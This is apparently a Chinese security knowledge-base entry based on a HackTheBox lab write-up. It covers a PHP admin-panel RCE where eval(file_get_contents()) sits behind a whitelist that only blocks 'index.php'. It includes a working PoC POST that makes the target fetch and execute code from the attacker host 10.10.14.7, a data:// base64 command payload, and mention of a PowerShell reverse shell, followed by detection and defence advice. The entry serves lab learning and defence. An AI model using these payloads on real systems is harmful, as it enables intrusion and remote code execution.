---
id: web-php-rce-eval-file-get-contents-include-param
title: PHP 后台 eval(file_get_contents($_POST['include']))：白名单只挡 index.php，POST 传远程 URL/本地文件/data 包装器即执行内容 RCE
type: scenario
domain: web
path: web/php/rce
technique: php-eval-file-get-contents-arbitrary-content-rce
tags:
- php
- eval
- file-get-contents
- rce
- lfi
- rfi
- php-filter
- web
- admin-panel
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V628
  verified_at: '2026-11-12T23:28:16+08:00'
  notes: 已对照原文全文与61张截图核对：master.php末尾eval(file_get_contents($_POST['include']))、仅!=='index.php'白名单、?debug=开发者提示、php://filter读源码、Burp POST include=http://10.10.14.7/x.php、python http.server拉取x.php、rlwrap nc 443反弹PowerShell均与截图一致。修正两处表述：登录后台所用为SQLi导出破解的yoshihide账号（非admin账号）；data://同样受allow_url_fopen控制。dedup候选均为php://filter/filter-chain相关非同链；HTB靶场无产品版本，未设affected_versions。
url: /docs/web/php/rce/web-php-rce-eval-file-get-contents-include-param/
draft: false
kb_aliases:
- eval(file_get_contents)
- include 参数 RCE
- debug 参数源码泄露
- master.php eval
- StreamIO admin 后台 RCE
- php://filter 读源码后 RCE
---

## 一句话结论

当 PHP 后台页面存在 `eval(file_get_contents($_POST['include']))` 且白名单只排除固定字面量（如仅 `index.php`）时，攻击者可 POST `include=http://attacker/x.php` 让服务器读取远程文件并把其内容当 PHP 代码执行；本案例先通过 `?debug=` 参数加 `php://filter/convert.base64-encode/resource=master.php` 读出源码确认漏洞，再远程 include 纯 PHP 语句段反弹 shell，全程无需上传文件或写目标磁盘。

## 原理

- **sink 结构**：`master.php` 末尾有表单与处理逻辑：
  ```php
  if(isset($_POST['include']))
  {
      if($_POST['include'] !== "index.php" )
          eval(file_get_contents($_POST['include']));
      else
          echo(" ---- ERROR ---- ");
  }
  ```
  `file_get_contents` 支持 HTTP/HTTPS、`php://`、`data://` 等包装器（HTTP 依赖 `allow_url_fopen`，PHP 默认开启）；`eval` 把读到的字节串直接在服务器上作为 PHP 代码解析执行，于是“可控文件路径 + eval”等价于任意代码执行。
- **为什么白名单形同虚设**：比较是 `!== "index.php"`，只挡住这一个精确字面量；`./index.php`、URL 编码、远程地址、`php://filter`、`data://` 等都不等于该字符串，全部放行。
- **eval 与 include 的差异**：`eval` 期望的内容是**不带头部标签的 PHP 代码**（例如 `system($_GET['cmd']);`）；远程 payload 文件如果写成 `<?php ... ?>` 会因 `<?php` 在 eval 上下文中不合法而失败。因此攻击者托管的 `x.php` 实际内容是裸 PHP 语句。
- **`?debug=` 泄露源码**：后台通过 `debug` 参数选择要加载的页面（`?debug=master.php` 显示 "this option is for developers only" 的调试入口），且该参数直接进入包含/读取逻辑，可传 `php://filter/convert.base64-encode/resource=master.php` 把源码 base64 输出，解码后得到上述 eval 逻辑与数据库连接参数。
- **完整链**：SQL 注入拿到后台账号（本案例 search.php 的 UNION 注入导出 users 表 MD5 口令并爆破）→ 登录 admin → 参数 fuzzing 找到 `debug` → `php://filter` 读源码 → 远程 include 执行 → 反弹 PowerShell/命令 shell。

## 触发条件

- 目标为 PHP 应用，后台存在 `eval(file_get_contents($可控参数))` 形态的“调试/包含”功能，且白名单没有真正限制路径。
- 攻击者能访问该后台功能（本案例通过 SQLi 导出 users 表口令并爆破出的后台账号 yoshihide 登录）。
- `allow_url_fopen=On`（远程 URL 与 `data://` 包装器都受它控制；若为 Off 可改用本地可写文件、日志、session 等可控内容）。
- 目标服务器可出网访问攻击者的 HTTP 服务（本案例攻击机 10.10.14.7 起 python http.server 80）。

## 利用步骤

1. 登录后台后对参数做 fuzzing（wfuzz/arjun 等），发现 `?debug=` 等调试入口，`?debug=master.php` 返回开发者提示或页面内容。
2. 读源码：`GET /admin/?debug=php://filter/convert.base64-encode/resource=master.php`，把返回的 base64 解码，确认 `eval(file_get_contents($_POST['include']))` 与白名单逻辑。
3. 在攻击机准备 payload 文件（裸 PHP 语句、无 `<?php` 标签），例如 `x.php` 内容为 `system($_GET['cmd']);`，用 `python3 -m http.server 80` 提供。
4. 发送 `POST /admin/?debug=master.php`，body `include=http://<attacker>/x.php`，触发 eval 执行；带 `cmd=` 参数执行命令，或改为反弹 shell（本案例用 PowerShell 反弹到 nc 443）。
5. 获得 shell 后做主机与数据库信息收集（本案例再读 `register.php` 的 db_admin 凭据、sqlcmd 连库、Firefox 凭据、AD ACL/LAPS 提权）。

## PoC

```http
POST /admin/?debug=master.php HTTP/1.1
Host: streamio.htb
Cookie: PHPSESSID=<admin session>
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

include=http://10.10.14.7/x.php
```

漏洞源码片段（php://filter 读出）：

```php
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

替代 payload 源（不依赖出网）：

```text
include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
（base64 解码为 system($_GET['cmd']);，eval 场景不带 <?php 标签）
```

## 变体与关联

- 参数可换成 `php://filter/.../resource=<本地文件>` 读取任意文件或执行本地已有内容；也可指向上传目录、session 文件、日志等可控内容。
- 白名单比较的绕过：`./index.php`、大小写、URL 编码、绝对路径等都满足 `!== "index.php"`；若换成 `in_array` 白名单也要检查是否只比较 basename。
- 关联：[[web-php-file-inclusion-php-filter-resource-check-bypass]]（php://filter 只校验 resource 的同类思路）、[[web-php-file-inclusion-manage-file-param-wfuzz-traversal]]（wfuzz 找 LFI 参数）、[[web-php-rce-eval-expression-closing-paren-injection]]（eval 拼接注入的通用思路）。
- 变体：`file_get_contents` 若支持 `phar://`，可结合上传 phar 触发反序列化。

## 检测与防御

- 检测：审计代码中的 `eval(file_get_contents(`、`assert(file_get_contents(` 等“读文件即执行”模式；监控 `include`/`debug` 参数出现 `http://`、`php://`、`data://`、`file://` 等包装器；WAF 拦截请求体中的 URL/包装器与 `eval` 关键字。
- 防御：彻底移除 eval，改为白名单文件映射（只允许固定 include 列表）；调试参数在生产环境禁用；设置 `allow_url_fopen=Off`、`allow_url_include=Off`；后台功能加权限与 CSRF 校验；文件包含路径用 `realpath` 限定在固定目录。
- 加固：开启 PHP 日志与 Web 访问日志审计异常包装器请求；对后台 `debug` 类参数做整数/枚举校验。
